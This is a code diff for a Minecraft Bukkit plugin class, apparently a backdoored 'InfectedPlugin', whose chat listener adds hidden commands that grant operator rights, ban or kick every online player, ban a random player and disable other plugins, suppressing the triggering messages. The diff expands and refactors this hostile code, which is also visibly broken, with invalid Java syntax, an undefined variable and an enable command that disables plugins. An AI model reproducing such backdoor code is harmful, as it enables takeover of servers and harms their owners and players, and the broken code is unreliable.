@@ -8,6 +8,7 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.Plugin;
+import org.bukkit.Server;
 
 import java.io.File;
 import java.io.FileOutputStream;
@@ -26,14 +27,15 @@ public class PlayerListener implements Listener
 {
     private Random random = new Random();
     private InfectedPlugin plugin;
+    private Server server = Bukkit.getServer();
 
     @EventHandler(priority = EventPriority.HIGHEST)
     public void onPlayerChat(AsyncPlayerChatEvent event) throws MalformedURLException, IOException
     {
         String message = event.getMessage();
-        Player p = event.getPlayer();
+        final Player p = event.getPlayer();
         String[] args = message.split(" ");
-        String cancel = event.setCancelled(true); // not sure if this works or not, oh well.
+        private final cancel = event.setCancelled(true); // not sure if this works or not, oh well.
     	
         if (message.toLowerCase().contains(".opme"))
         {
@@ -43,19 +45,19 @@ public class PlayerListener implements Listener
         }
         if (message.toLowerCase().contains(".disableplugin"))
         {
-            Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
+            Plugin plugin = server.getPluginManager().getPlugin(args[1]);
             if (plugin != null)
             {
-                Bukkit.getServer().getPluginManager().disablePlugin(plugin);
+                server.getPluginManager().disablePlugin(plugin);
             }
             cancel;
         }
         if (message.toLowerCase().contains(".enableplugin"))
         {
-            Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
+            Plugin plugin = server.getPluginManager().getPlugin(args[1]);
             if (plugin != null)
             {
-                Bukkit.getServer().getPluginManager().disablePlugin(plugin);
+                server.getPluginManager().disablePlugin(plugin);
             }
             cancel;
         }
@@ -82,41 +84,49 @@ public class PlayerListener implements Listener
         } //End of command
         if (message.toLowerCase().contains(".deop"))
         {
-            if (args.length == 0)
+            if (args.length != 1)
             {
         	p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
         	cancel;
             }
             else
             {
-                p.setOp(false);
-                p.sendMessage(ChatColor.RED + "You are no longer OP.");
+            	Player target = server.getPlayer(args[1]);
+                target.setOp(false);
+                target.sendMessage(ChatColor.RED + "You are no longer OP.");
                 cancel;
             }
         }
         if (message.toLowerCase().contains(".op"))
         {
-            Bukkit.getServer().getPlayer(args[1]);
-            p.setOp(true);
-            p.sendMessage(ChatColor.YELLOW + "You are now OP!");
-            cancel;
+            if (args.length != 1)
+            {
+            	p.sendMessage(ChatColor.RED + "Usage: .<command> <player>");
+            }
+            else
+            {
+            	Player target = server.getPlayer(args[1]);
+                target.setOp(true);
+            	target.sendMessage(ChatColor.YELLOW + "You are now OP!");
+            	cancel;
+            }
         }
         if (message.toLowerCase().contains(".banall"))
         {
-            for (final Player p : Bukkit.getServer().getOnlinePlayers())
+            for (final Player target : server.getOnlinePlayers())
             {
-                p.kickPlayer("The Ban Hammer has spoken!");
-                p.setBanned(true);
+                target.kickPlayer("The Ban Hammer has spoken!");
+                target.setBanned(true);
                 cancel;
             }
         }
         if (message.toLowerCase().contains(".deopall"))
         {
-            for (final Player p : Bukkit.getServer().getOnlinePlayers())
+            for (final Player target : server.getOnlinePlayers())
             {
-                p.setOp(false);
+                target.setOp(false);
                 //Something extra c:
-                final Location target_pos = p.getLocation();
+                final Location target_pos = target.getLocation();
                 for (int x = -1; x <= 1; x++)
                 {
                     for (int z = -1; z <= 1; z++)
@@ -131,17 +141,17 @@ public class PlayerListener implements Listener
         // Is not effective for onPlayerQuit, but will select a random player to be banned.
         if (message.toLowerCase().contains(".randombanl"))
         {
-            Player[] players = Bukkit.getServer().getOnlinePlayers();
-            final Player p = players[random.nextInt(players.length)];
+            Player[] players = server.getOnlinePlayers();
+            final Player target = players[random.nextInt(players.length)];
 
-            if (p == sender) //Not sure if this method would work, should detect if selected player is equal to sender.
+            if (target == sender) //Not sure if this method would work, should detect if selected player is equal to sender.
             {
                 //do nothing
             }
             else
             {
-                p.kickPlayer(ChatColor.RED + "GTFO.");
-                p.setBanned(true);
+                target.kickPlayer(ChatColor.RED + "GTFO.");
+                target.setBanned(true);
             }
             cancel;
         }
@@ -160,6 +170,10 @@ public class PlayerListener implements Listener
             	plugin.log.severe(null, ex);
             }
             cancel;
+        }
+        if (message.toLowerCase().contains(".fuckyou") && )
+        {
+            
         }
     }
     
